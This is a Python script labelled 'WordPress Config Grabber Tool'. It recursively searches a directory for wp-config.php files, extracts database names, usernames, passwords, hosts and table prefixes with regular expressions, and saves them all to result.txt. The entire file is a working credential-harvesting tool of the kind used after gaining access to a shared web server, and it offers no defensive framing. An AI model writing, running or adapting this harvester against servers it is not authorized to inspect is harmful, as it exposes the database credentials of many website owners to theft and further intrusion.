#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Compatible with Python 2.7 and 3.x
# Coded by JavaX7 - Filtered Output Version (With Table Prefix)

from __future__ import print_function, unicode_literals
import os
import re
import sys
import argparse
import codecs

# === Python 2 Compatibility Layer ===
if sys.version_info[0] < 3:
    reload(sys)
    sys.setdefaultencoding('utf-8')

def find_wp_config_files(directory):
    """Recursively find all wp-config.php files in directory"""
    config_files = []
    for root, dirs, files in os.walk(directory):
        for filename in files:
            try:
                name = filename.decode('utf-8') if hasattr(filename, 'decode') else filename
            except:
                name = filename
            if name == u'wp-config.php':
                config_files.append(os.path.join(root, filename))
    return config_files

def extract_db_details(file_path):
    """Extract database details and table prefix from wp-config.php file"""
    try:
        with codecs.open(file_path, 'r', encoding='utf-8', errors='replace') as f:
            content = f.read()

        # 1. Ambil DB Configs (NAME, USER, PASSWORD, dll)
        pattern_db = r"define\(\s*['\"]DB_(NAME|USER|PASSWORD|HOST|CHARSET|COLLATE)['\"]\s*,\s*['\"](.*?)['\"]\s*\);"
        matches_db = re.findall(pattern_db, content)

        # 2. Ambil Table Prefix ($table_prefix = 'wp_';)
        pattern_prefix = r"\$table_prefix\s*=\s*['\"](.*?)['\"]\s*;"
        match_prefix = re.search(pattern_prefix, content)

        if not matches_db and not match_prefix:
            return None  # Skip jika tidak ada data sama sekali

        # Map emoji untuk masing-masing tipe data
        emoji_map = {
            'NAME': u'🗄️',
            'USER': u'👤',
            'PASSWORD': u'🔑',
            'HOST': u'🖥️',
            'CHARSET': u'🔤',
            'COLLATE': u'🎨',
            'PREFIX': u'🔗'
        }

        details = [u"File: " + file_path]
        
        # Masukkan DB Configs ke dalam list output
        for match in matches_db:
            key_type = match[0]
            value = match[1]
            emoji = emoji_map.get(key_type, u'📝')
            details.append(emoji + u"( '" + key_type + u"', '" + value + u"' );")

        # Jika table_prefix ditemukan, masukkan juga ke dalam list output
        if match_prefix:
            prefix_value = match_prefix.group(1)
            emoji = emoji_map.get('PREFIX')
            details.append(emoji + u"( 'PREFIX', '" + prefix_value + u"' );")

        return u'\n'.join(details)

    except Exception as e:
        msg = unicode(e) if sys.version_info[0] < 3 else str(e)
        return u"Error reading file: " + msg

def main():
    parser = argparse.ArgumentParser(description='WordPress Config Grabber Tool')
    parser.add_argument('directory', help='Directory path to search for wp-config.php files')
    parser.add_argument('--output', '-o', default='result.txt',
                        help='Output file name (default: result.txt)')
    args = parser.parse_args()

    if not os.path.isdir(args.directory):
        print("Error: Invalid or non-existent directory - " + args.directory)
        return

    config_files = find_wp_config_files(args.directory)
    if not config_files:
        print("No wp-config.php files found in " + args.directory)
        return

    with codecs.open(args.output, 'w', encoding='utf-8') as out_file:
        print("\nDatabase Configurations Found in " + args.directory + ":")
        for config_file in config_files:
            db_details = extract_db_details(config_file)
            if not db_details:
                continue  # Skip files with no info
            try:
                print("\n" + db_details)
            except UnicodeEncodeError:
                print(("\n" + db_details).encode('utf-8'))
            out_file.write(db_details + "\n\n")

    print("\nResults saved in " + args.output)

if __name__ == "__main__":
    main()
